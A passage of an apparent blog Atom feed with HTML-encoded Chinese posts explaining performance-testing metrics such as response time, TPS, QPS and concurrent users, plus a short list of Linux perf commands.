&#x5E73;&#x5747;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x6307;&#x6807;&#x503C;&#x5E94;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x7684;&#x4EA4;&#x6613;&#x5206;&#x522B;&#x8BBE;&#x5B9A;&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5206;&#x4E3A;&#x590D;&#x6742;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3001;&#x7B80;&#x5355;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3001;&#x7279;&#x6B8A;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3002;&#x5176;&#x4E2D;&#xFF0C;&#x7279;&#x6B8A;&#x4EA4;&#x6613;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x7684;&#x8BBE;&#x5B9A;&#x5FC5;&#x987B;&#x660E;&#x786E;&#x8BE5;&#x4EA4;&#x6613;&#x5728;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x65B9;&#x9762;&#x7684;&#x7279;&#x6B8A;&#x6027;&#x3002;</p></blockquote><p>Response Time: &#x7B80;&#x79F0;RT</p><blockquote><p>&#x4E0D;&#x540C;&#x884C;&#x4E1A;&#x4E0D;&#x540C;&#x4E1A;&#x52A1;&#x53EF;&#x63A5;&#x53D7;&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x662F;&#x4E0D;&#x540C;&#x7684;&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#xFF0C;&#x5BF9;&#x4E8E;&#x5728;&#x7EBF;&#x5B9E;&#x65F6;&#x4EA4;&#x6613;&#xFF1A;<br>&#x4E92;&#x8054;&#x7F51;&#x4F01;&#x4E1A;&#xFF1A;500&#x6BEB;&#x79D2;&#x4EE5;&#x4E0B;&#xFF0C;&#x4F8B;&#x5982;&#x6DD8;&#x5B9D;&#x4E1A;&#x52A1;10&#x6BEB;&#x79D2;&#x5DE6;&#x53F3;&#x3002;<br>&#x91D1;&#x878D;&#x4F01;&#x4E1A;&#xFF1A;1&#x79D2;&#x4EE5;&#x4E0B;&#x4E3A;&#x4F73;&#xFF0C;&#x90E8;&#x5206;&#x590D;&#x6742;&#x4E1A;&#x52A1;3&#x79D2;&#x4EE5;&#x4E0B;&#x3002;<br>&#x4FDD;&#x9669;&#x4F01;&#x4E1A;&#xFF1A;3&#x79D2;&#x4EE5;&#x4E0B;&#x4E3A;&#x4F73;&#x3002;<br>&#x5236;&#x9020;&#x4E1A;&#xFF1A;5&#x79D2;&#x4EE5;&#x4E0B;&#x4E3A;&#x4F73;&#x3002;</p></blockquote><p>&#x5BF9;&#x4E8E;&#x6279;&#x91CF;&#x4EA4;&#x6613;&#xFF1A;</p><blockquote><p>&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#xFF1A;&#x5373;&#x6574;&#x4E2A;&#x538B;&#x6D4B;&#x8FC7;&#x7A0B;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x4E0D;&#x540C;&#x6570;&#x636E;&#x91CF;&#x5219;&#x65F6;&#x95F4;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x4F8B;&#x5982;&#x53CC;11&#x548C;99&#x5927;&#x4FC3;&#xFF0C;&#x6570;&#x636E;&#x91CF;&#x7EA7;&#x4E0D;&#x4E00;&#x6837;&#x5219;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#x4E0D;&#x540C;&#x3002;&#x5927;&#x6570;&#x636E;&#x91CF;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;2&#x5C0F;&#x65F6;&#x5185;&#x53EF;&#x5B8C;&#x6210;&#x538B;&#x6D4B;&#x3002;</p></blockquote><p>3.2 &#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;</p><blockquote><p>&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x662F;&#x6307;&#x7CFB;&#x7EDF;&#x5728;&#x5229;&#x7528;&#x7CFB;&#x7EDF;&#x786C;&#x4EF6;&#x5E73;&#x53F0;&#x548C;&#x8F6F;&#x4EF6;&#x5E73;&#x53F0;&#x8FDB;&#x884C;&#x4FE1;&#x606F;&#x5904;&#x7406;&#x7684;&#x80FD;&#x529B;&#x3002; &#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x901A;&#x8FC7;&#x7CFB;&#x7EDF;&#x6BCF;&#x79D2;&#x949F;&#x80FD;&#x591F;&#x5904;&#x7406;&#x7684;&#x4EA4;&#x6613;&#x6570;&#x91CF;&#x6765;&#x8BC4;&#x4EF7;&#xFF0C;&#x4EA4;&#x6613;&#x6709;&#x4E24;&#x79CD;&#x7406;&#x89E3;&#xFF1A;&#x4E00;&#x662F;&#x4E1A;&#x52A1;&#x4EBA;&#x5458;&#x89D2;&#x5EA6;&#x7684;&#x4E00;&#x7B14;&#x4E1A;&#x52A1;&#x8FC7;&#x7A0B;&#xFF1B;&#x4E8C;&#x662F;&#x7CFB;&#x7EDF;&#x89D2;&#x5EA6;&#x7684;&#x4E00;&#x6B21;&#x4EA4;&#x6613;&#x7533;&#x8BF7;&#x548C;&#x54CD;&#x5E94;&#x8FC7;&#x7A0B;&#x3002;&#x524D;&#x8005;&#x79F0;&#x4E3A;&#x4E1A;&#x52A1;&#x4EA4;&#x6613;&#x8FC7;&#x7A0B;&#xFF0C;&#x540E;&#x8005;&#x79F0;&#x4E3A;&#x4E8B;&#x52A1;&#x3002;&#x4E24;&#x79CD;&#x4EA4;&#x6613;&#x6307;&#x6807;&#x90FD;&#x53EF;&#x4EE5;&#x8BC4;&#x4EF7;&#x5E94;&#x7528;&#x7CFB;&#x7EDF;&#x7684;&#x5904;&#x7406;&#x80FD;&#x529B;&#x3002;&#x4E00;&#x822C;&#x7684;&#x5EFA;&#x8BAE;&#x4E0E;&#x7CFB;&#x7EDF;&#x4EA4;&#x6613;&#x65E5;&#x5FD7;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#xFF0C;&#x4EE5;&#x4FBF;&#x4E8E;&#x7EDF;&#x8BA1;&#x4E1A;&#x52A1;&#x91CF;&#x6216;&#x8005;&#x4EA4;&#x6613;&#x91CF;&#x3002;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x6307;&#x6807;&#x662F;&#x6280;&#x672F;&#x6D4B;&#x8BD5;&#x6D3B;&#x52A8;&#x4E2D;&#x91CD;&#x8981;&#x6307;&#x6807;&#x3002;</p></blockquote><p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7528;&#x4EE5;&#x4E0B;&#x6307;&#x6807;&#x6765;&#x5EA6;&#x91CF;&#xFF1A;</p><blockquote><p>HPS&#xFF08;Hits Per Second&#xFF09; &#xFF1A;&#x6BCF;&#x79D2;&#x70B9;&#x51FB;&#x6B21;&#x6570;&#xFF0C;&#x5355;&#x4F4D;&#x662F;&#x6B21;/&#x79D2;&#x3002;<br>TPS&#xFF08;Transaction per Second&#xFF09;&#xFF1A;&#x7CFB;&#x7EDF;&#x6BCF;&#x79D2;&#x5904;&#x7406;&#x4EA4;&#x6613;&#x6570;&#xFF0C;&#x5355;&#x4F4D;&#x662F;&#x7B14;/&#x79D2;&#x3002;<br>QPS&#xFF08;Query per Second&#xFF09;&#xFF1A;&#x7CFB;&#x7EDF;&#x6BCF;&#x79D2;&#x5904;&#x7406;&#x67E5;&#x8BE2;&#x6B21;&#x6570;&#xFF0C;&#x5355;&#x4F4D;&#x662F;&#x6B21;/&#x79D2;&#x3002; &#x5BF9;&#x4E8E;&#x4E92;&#x8054;&#x7F51;&#x4E1A;&#x52A1;&#x4E2D;&#xFF0C;&#x5982;&#x679C;&#x67D0;&#x4E9B;&#x4E1A;&#x52A1;&#x6709;&#x4E14;&#x4EC5;&#x6709;&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x8FDE;&#x63A5;&#xFF0C;&#x90A3;&#x4E48;TPS=QPS=HPS&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#x7528;TPS&#x6765;&#x8861;&#x91CF;&#x6574;&#x4E2A;&#x4E1A;&#x52A1;&#x6D41;&#x7A0B;&#xFF0C;&#x7528;QPS&#x6765;&#x8861;&#x91CF;&#x63A5;&#x53E3;&#x67E5;&#x8BE2;&#x6B21;&#x6570;&#xFF0C;&#x7528;HPS&#x6765;&#x8868;&#x793A;&#x5BF9;&#x670D;&#x52A1;&#x5668;&#x5355;&#x51FB;&#x8BF7;&#x6C42;&#x3002;  </p></blockquote><p>&#x6807;&#x51C6;</p><blockquote><p>&#x65E0;&#x8BBA;TPS&#x3001;QPS&#x3001;HPS&#xFF0C;&#x6B64;&#x6307;&#x6807;&#x662F;&#x8861;&#x91CF;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x975E;&#x5E38;&#x91CD;&#x8981;&#x7684;&#x6307;&#x6807;&#xFF0C;&#x8D8A;&#x5927;&#x8D8A;&#x597D;&#xFF0C;&#x6839;&#x636E;&#x7ECF;&#x9A8C;&#xFF0C;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF1A;<br>&#x91D1;&#x878D;&#x884C;&#x4E1A;&#xFF1A;1000 TPS&#x3002;<br>&#x4FDD;&#x9669;&#x884C;&#x4E1A;&#xFF1A;100000 TPS&#xFF0C;&#x4E0D;&#x5305;&#x62EC;&#x4E92;&#x8054;&#x7F51;&#x5316;&#x7684;&#x6D3B;&#x52A8;&#x3002;<br>&#x5236;&#x9020;&#x884C;&#x4E1A;&#xFF1A;10 TPS&#x3002;<br>&#x4E92;&#x8054;&#x7F51;&#x7535;&#x5B50;&#x5546;&#x52A1;&#xFF1A;1000000 TPS&#x3002;<br>&#x4E92;&#x8054;&#x7F51;&#x4E2D;&#x578B;&#x7F51;&#x7AD9;&#xFF1A;1000 TPS&#x3002;<br>&#x4E92;&#x8054;&#x7F51;&#x5C0F;&#x578B;&#x7F51;&#x7AD9;&#xFF1A;10000 TPS&#x3002;    </p></blockquote><p>3.3 &#x5E76;&#x53D1;&#x7528;&#x6237;</p><blockquote><p>&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x6307;&#x5728;&#x540C;&#x4E00;&#x65F6;&#x523B;&#x5185;&#xFF0C;&#x767B;&#x5F55;&#x7CFB;&#x7EDF;&#x5E76;&#x8FDB;&#x884C;&#x4E1A;&#x52A1;&#x64CD;&#x4F5C;&#x7684;&#x7528;&#x6237;&#x6570;&#x91CF;&#x3002; &#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5BF9;&#x4E8E;&#x957F;&#x8FDE;&#x63A5;&#x7CFB;&#x7EDF;&#x6765;&#x8BF4;&#x6700;&#x5927;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5373;&#x662F;&#x7CFB;&#x7EDF;&#x7684;&#x5E76;&#x53D1;&#x63A5;&#x5165;&#x80FD;&#x529B;&#x3002;&#x5BF9;&#x4E8E;&#x77ED;&#x8FDE;&#x63A5;&#x7CFB;&#x7EDF;&#x800C;&#x8A00;&#x6700;&#x5927;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5E76;&#x4E0D;&#x7B49;&#x4E8E;&#x7CFB;&#x7EDF;&#x7684;&#x5E76;&#x53D1;&#x63A5;&#x5165;&#x80FD;&#x529B;&#xFF0C;&#x800C;&#x662F;&#x4E0E;&#x7CFB;&#x7EDF;&#x67B6;&#x6784;&#x3001;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x7B49;&#x5404;&#x79CD;&#x60C5;&#x51B5;&#x76F8;&#x5173;&#x3002;&#x4F8B;&#x5982;&#x7CFB;&#x7EDF;&#x541E;&#x5410;&#x80FD;&#x529B;&#x5F88;&#x5F3A;&#xFF0C;&#x52A0;&#x4E0A;&#x77ED;&#x8FDE;&#x63A5;&#x4E00;&#x822C;&#x90FD;&#x6709;&#x8FDE;&#x63A5;&#x590D;&#x7528;&#xFF0C;&#x5F80;&#x5F80;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5927;&#x4E8E;&#x7CFB;&#x7EDF;&#x7684;&#x5E76;&#x53D1;&#x63A5;&#x5165;&#x8FDE;&#x63A5;&#x6570;&#x3002;&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x5927;&#x90E8;&#x5206;&#x77ED;&#x8FDE;&#x63A5;&#x7C7B;&#x578B;&#x7684;&#x7CFB;&#x7EDF;&#xFF0C;&#x541E;&#x5410;&#x91CF;&#x6A21;&#x5F0F;&#xFF08;RPS&#x6A21;&#x5F0F;&#xFF0C;Request Per Second&#xFF09;&#x6BD4;&#x8F83;&#x9002;&#x5408;&#xFF0C;&#x4E5F;&#x662F;&#x963F;&#x91CC;&#x7684;&#x6700;&#x4F73;&#x5B9E;&#x8DF5;&#xFF0C;PTS&#x652F;&#x6301;RPS&#x6A21;&#x5F0F;&#x7684;&#x538B;&#x6D4B;&#xFF0C;&#x541E;&#x5410;&#x91CF;&#x7684;&#x538B;&#x6D4B;&#x6784;&#x5EFA;&#x548C;&#x8861;&#x91CF;&#x4E00;&#x6B65;&#x5230;&#x4F4D;&#x3002; &#x5728;&#x6D4B;&#x8BD5;&#x4E2D;&#xFF0C;&#x91C7;&#x7528;&#x865A;&#x62DF;&#x7528;&#x6237;&#x6765;&#x6A21;&#x62DF;&#x73B0;&#x5B9E;&#x4E2D;&#x7528;&#x6237;&#x8FDB;&#x884C;&#x4E1A;&#x52A1;&#x64CD;&#x4F5C;&#x3002;</p></blockquote><p>Virtual User&#xFF1A;&#x7B80;&#x79F0;VU</p><p>&#x6807;&#x51C6;</p><blockquote><p>&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x662F;&#x5C06;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x5BB9;&#x91CF;&#x6D4B;&#x51FA;&#x6765;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6D4B;&#x8BD5;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#xFF0C;&#x9664;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x957F;&#x8FDE;&#x63A5;&#x53EF;&#x80FD;&#x5F71;&#x54CD;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5916;&#xFF0C;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x4E0D;&#x53D7;&#x5E76;&#x53D1;&#x7528;&#x6237;&#x6570;&#x5F71;&#x54CD;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6700;&#x5C0F;&#x7684;&#x7528;&#x6237;&#x6570;&#x5C06;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x5BB9;&#x91CF;&#x6D4B;&#x8BD5;&#x51FA;&#x6765;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x66F4;&#x591A;&#x7684;&#x7528;&#x6237;&#x5C06;&#x7CFB;&#x7EDF;&#x5904;&#x7406;&#x80FD;&#x529B;&#x5BB9;&#x91CF;&#x6D4B;&#x8BD5;&#x51FA;&#x6765;&#x3002;</p></blockquote><p>3.4 &#x9519;&#x8BEF;&#x7387;<br>&#x5B9A;&#x4E49;&#x53CA;&#x89E3;&#x91CA;</p><blockquote><p>&#x539F;&#x6587;<a href="https://www.leoheng.com/2021/06/25/%E5%B8%B8%E7%94%A8%E6%80%A7%E8%83%BD%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">https://www.leoheng.com/2021/06/25/%E5%B8%B8%E7%94%A8%E6%80%A7%E8%83%BD%E5%8E%8B%E6%B5%8B%E5%B7%A5%E5%85%B7%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;&amp;#x5E38;&amp;#x7528;&amp;#x6027;&amp;#x80FD;&amp;#x538B;&amp;#x6D4B;&amp;#x5DE5;&amp;#x5177;&amp;#x5B9E;&amp;#x6218;&amp;#x603B;&amp;#x7ED3;&quot;&gt;&lt;a href=&quot;#&amp;#x5E38;&amp;#x7528;&amp;#x6027;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux常用性能分析工具</title>
    <link href="https://marnm.github.io//posts/d53cba09/"/>
    <id>https://marnm.github.io//posts/d53cba09/</id>
    <published>2022-06-07T04:54:45.000Z</published>
    <updated>2022-06-07T04:56:53.593Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Linux性能管理工具</title>
    <link href="https://marnm.github.io//posts/480c215d/"/>
    <id>https://marnm.github.io//posts/480c215d/</id>
    <published>2022-06-07T04:54:32.000Z</published>
    <updated>2022-06-07T05:00:45.255Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x6027;&#x80FD;&#x6D4B;&#x8BD5;"><a href="#&#x6027;&#x80FD;&#x6D4B;&#x8BD5;" class="headerlink" title="&#x6027;&#x80FD;&#x6D4B;&#x8BD5;"></a>&#x6027;&#x80FD;&#x6D4B;&#x8BD5;</h2><h3 id="perf"><a href="#perf" class="headerlink" title="perf"></a>perf</h3><h4 id="&#x5E38;&#x7528;&#x7684;perf&#x547D;&#x4EE4;"><a href="#&#x5E38;&#x7528;&#x7684;perf&#x547D;&#x4EE4;" class="headerlink" title="&#x5E38;&#x7528;&#x7684;perf&#x547D;&#x4EE4;"></a>&#x5E38;&#x7528;&#x7684;perf&#x547D;&#x4EE4;</h4><ul><li>perf stat<br>  &#x8FD9;&#x4E2A;&#x547D;&#x4EE4;&#x63D0;&#x4F9B;&#x5E38;&#x89C1;&#x7684;&#x6027;&#x80FD;&#x4E8B;&#x4EF6;&#x7EDF;&#x8BA1;&#x4FE1;&#x606F;&#xFF0C;&#x5305;&#x62EC;&#x8BF4;&#x660E;&#x6267;&#x884C;&#x548C;&#x6D88;&#x8017;&#x7684;&#x65F6;&#x949F;&#x5468;&#x671F;&#x3002;</li><li>perf record<br>  &#x8BE5;&#x547D;&#x4EE4;&#x80FD;&#x591F;&#x5C06;&#x6570;&#x636E;&#x8BB0;&#x5F55;&#x5E76;&#x751F;&#x6210;&#x4E00;&#x4E2A;perf.data&#x6587;&#x4EF6;</li><li>perf report<br>  &#x8BE5;&#x547D;&#x4EE4;&#x4ECE;perf record&#x751F;&#x6210;&#x7684;perf.data&#x6587;&#x4EF6;&#x4E2D;&#x8BFB;&#x53D6;&#x5E76;&#x663E;&#x793A;&#x4E8B;&#x4EF6;&#x6570;&#x636E;&#x3002;</li><li>perf list<br>  &#x5217;&#x51FA;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x53EF;&#x7528;&#x4E8B;&#x4EF6;</li><li><p>perf top<br>  &#x8BE5;&#x547D;&#x4EE4;&#x4E0E;<code>top</code>&#x547D;&#x4EE4;&#x7C7B;&#x4F3C;&#xFF0C;&#x5B9E;&#x65F6;&#x663E;&#x793A;&#x6027;&#x80FD;&#x4E8B;&#x4EF6;<br>  <img src="http://192.168.85.188:8081/uploads/165292411776693751202205072153614.png" alt=""></p></li><li><p>perf  trace<br>  &#x8BE5;&#x547D;&#x4EE4;&#x4E0E;<code>strace</code>&#x547D;&#x4EE4;&#x7C7B;&#x4F3C;&#xFF0C;&#x76D1;&#x89C6;&#x6307;&#x5B9A;&#x7EBF;&#x7A0B;&#x6216;&#x8FDB;&#x7A0B;&#x4F7F;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x8C03;&#x7528;&#x4EE5;&#x53CA;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x63A5;&#x6536;&#x5230;&#x7684;&#x6240;&#x6709;&#x4FE1;&#x53F7;&#x3002;</p></li><li>perf help</li></ul><pre><code class="bash">perf list   # &#x67E5;&#x770B;&#x5F53;&#x524D;&#x652F;&#x6301;&#x7684;&#x6240;&#x6709;&#x4E8B;&#x4EF6;# [Software event]&#x8F6F;&#x4EF6;&#x4E8B;&#x4EF6;# [Tool event]# [Hardware cache event]  &#x786C;&#x4EF6;&#x7F13;&#x5B58;&#x4E8B;&#x4EF6;# [Kernel PMU event] PMU&#x4E8B;&#x4EF6;# [Hardware event]# Tracepoint event# </code></pre><h2 id="&#x6027;&#x80FD;&#x4F18;&#x5316;"><a href="#&#x6027;&#x80FD;&#x4F18;&#x5316;" class="headerlink" title="&#x6027;&#x80FD;&#x4F18;&#x5316;"></a>&#x6027;&#x80FD;&#x4F18;&#x5316;</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x6027;&amp;#x80FD;&amp;#x6D4B;&amp;#x8BD5;&quot;&gt;&lt;a href=&quot;#&amp;#x6027;&amp;#x80FD;&amp;#x6D4B;&amp;#x8BD5;&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x6027;&amp;#x80FD;&amp;#x6D4B;&amp;#x8
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>性能测试指标详解</title>
    <link href="https://marnm.github.io//posts/fa35a60d/"/>
    <id>https://marnm.github.io//posts/fa35a60d/</id>
    <published>2022-06-07T04:54:19.000Z</published>
    <updated>2022-06-07T05:01:02.229Z</updated>
    
    <content type="html"><![CDATA[<h1 id="&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x2014;&#x2014;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x5404;&#x6307;&#x6807;&#x8BF4;&#x660E;"><a href="#&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x2014;&#x2014;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x5404;&#x6307;&#x6807;&#x8BF4;&#x660E;" class="headerlink" title="&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x2014;&#x2014;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x5404;&#x6307;&#x6807;&#x8BF4;&#x660E;"></a>&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x2014;&#x2014;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x5404;&#x6307;&#x6807;&#x8BF4;&#x660E;</h1><p>&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;&#x662F;&#x8861;&#x91CF;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x7684;&#x8BC4;&#x4EF7;&#x6807;&#x51C6;&#xFF0C;&#x5E38;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;&#x5305;&#x62EC;&#xFF1A;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x3001;&#x5E76;&#x53D1;&#x3001;&#x70B9;&#x51FB;&#x7387;&#x3001;&#x541E;&#x5410;&#x91CF;&#x3001;TPS/QPS&#x3001;PV/UV&#xFF1B;Linux&#x670D;&#x52A1;&#x5668;&#x5E38;&#x7528;&#x7684;&#x6027;&#x80FD;&#x6307;&#x6807;&#x5305;&#x62EC;&#xFF1A;CPU&#x4F7F;&#x7528;&#x7387;&#x3001;&#x5185;&#x5B58;&#x5360;&#x7528;&#x7387;&#x3001;&#x78C1;&#x76D8;IO&#x3001;&#x7CFB;&#x7EDF;&#x5E73;&#x5747;&#x8D1F;&#x8F7D;&#x7B49;&#x3002;</p><h2 id="&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;"><a href="#&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;" class="headerlink" title="&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;"></a>&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x6307;&#x6807;</h2><h3 id="1-1-&#x54CD;&#x5E94;&#x65F6;&#x95F4;"><a href="#1-1-&#x54CD;&#x5E94;&#x65F6;&#x95F4;" class="headerlink" title="1.1 &#x54CD;&#x5E94;&#x65F6;&#x95F4;"></a>1.1 &#x54CD;&#x5E94;&#x65F6;&#x95F4;</h3><p>&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x662F;&#x6307;&#x67D0;&#x4E2A;&#x8BF7;&#x6C42;&#x6216;&#x64CD;&#x4F5C;&#x53D1;&#x51FA;&#x5230;&#x63A5;&#x6536;&#x5230;&#x53CD;&#x9988;&#x6240;&#x6D88;&#x8017;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x5305;&#x62EC;&#x5E94;&#x7528;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x5BA2;&#x6237;&#x7AEF;&#xFF09;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x3001;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#x65F6;&#x95F4;&#x4EE5;&#x53CA;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x3002;&#x6BD4;&#x5982;&#x4E00;&#x4E2A;&#x9875;&#x9762;&#x4ECE;&#x70B9;&#x51FB;/&#x8F93;&#x5165;&#x5230;&#x5B8C;&#x5168;&#x52A0;&#x8F7D;&#x7684;&#x65F6;&#x95F4;&#xFF1B;&#x5B8C;&#x6210;&#x4E00;&#x6B21;&#x589E;&#x52A0;&#x3001;&#x5220;&#x9664;&#x3001;&#x4FEE;&#x6539;&#x6216;&#x8005;&#x67E5;&#x8BE2;&#x52A8;&#x4F5C;&#x7684;&#x4E8B;&#x52A1;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x7B49;&#x3002;</p><p>&#x4E00;&#x4E2A;&#x8BF7;&#x6C42;&#x5728;&#x7F51;&#x7EDC;&#x4E0A;&#x7684;&#x4F20;&#x8F93;&#x5F80;&#x5F80;&#x8981;&#x7ECF;&#x5386;&#x591A;&#x4E2A;&#x7F51;&#x7EDC;&#x8282;&#x70B9;&#x624D;&#x80FD;&#x5230;&#x8FBE;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x6211;&#x4EEC;&#x5047;&#x8BBE;&#x8BF7;&#x6C42;&#x7ECF;&#x5386;&#x4E86;&#x4E09;&#x4E2A;&#x7F51;&#x7EDC;&#x8282;&#x70B9;&#x7684;&#x4F20;&#x8F93;&#x65F6;&#x95F4;B1&#x3001;B2&#x3001;B3&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x4E3A;A&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x4E3A;C&#x3002;&#x5219;&#x4E00;&#x6B21;&#x8BF7;&#x6C42;&#x7684;&#x5B8C;&#x6574;&#x8DEF;&#x5F84;&#x53EF;&#x4EE5;&#x63CF;&#x8FF0;&#x4E3A;&#x4E0B;&#x56FE;&#xFF1A;</p><p><img src="http://192.168.84.188:8081/uploads/16529237626752468130515.png" alt=""></p><p>&#x5BA2;&#x6237;&#x7AEF;&#x4ECE;&#x53D1;&#x51FA;&#x8BF7;&#x6C42;&#x5230;&#x63A5;&#x6536;&#x5230;&#x670D;&#x52A1;&#x5668;&#x53CD;&#x9988;&#x7684;&#x5B8C;&#x6574;&#x94FE;&#x8DEF;&#x65F6;&#x95F4;&#x4E3A;A&#x2014;&gt;B1&#x2014;&gt;B2&#x2014;&gt;B3&#x2014;&gt;C&#xFF08;&#x8282;&#x70B9;&#x5904;&#x7406;&#x65F6;&#x95F4;&#x90FD;&#x5305;&#x62EC;&#x63A5;&#x6536;&#x548C;&#x53D1;&#x9001;&#x4E24;&#x4E2A;&#x8FC7;&#x7A0B;&#xFF09;&#x3002;&#x5219;&#x8BF7;&#x6C42;&#x7684;&#x54CD;&#x5E94;&#x65F6;&#x95F4;&#x4E3A;&#xFF1A;</p><p>&#x54CD;&#x5E94;&#x65F6;&#x95F4;=A+B1+B2+B3+C</p><h3 